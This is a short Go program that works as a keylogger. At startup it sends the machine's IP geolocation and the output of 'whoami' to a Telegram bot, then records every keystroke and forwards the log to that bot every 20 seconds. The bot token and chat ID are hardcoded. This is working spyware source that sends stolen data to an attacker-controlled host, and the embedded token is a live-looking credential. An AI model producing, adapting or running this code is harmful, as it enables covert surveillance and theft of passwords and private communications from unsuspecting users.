package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"time"

	"github.com/eiannone/keyboard"
)

var logs string

const (
	botToken = "7849597289:AAHZ3yvh8fGs-EX4qUKGAzCM098RQh5sNE0"
	ChatID   = "1859109698"
)

func main() {
	sendM(localisation())
	version := system("whoami")
	sendM(version)
	err := keyboard.Open() // ouvrir le clavier
	if err != nil {
		log.Fatal(err)
	}
	defer keyboard.Close()

	go func() {
		for {
			time.Sleep(20 * time.Second)
			if logs != "" {
				sendM(logs)
				logs = ""
			}
		}
	}()

	for {
		char, _, err := keyboard.GetKey() // fonction principale
		if err != nil {
			log.Fatal(err)
		}
		logs += string(char)
	}
}

func sendM(message string) {
	apiURL := fmt.Sprintf(
		"https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
		botToken, ChatID, url.QueryEscape(message),
	)

	_, err := http.Get(apiURL)
	if err != nil {
		return
	}
}

func localisation() string {
	resp, err := http.Get("https://ipinfo.io/")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return string(body)
}

func system(cmdstr string) string {
	cmd := exec.Command(cmdstr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	return string(output)
}
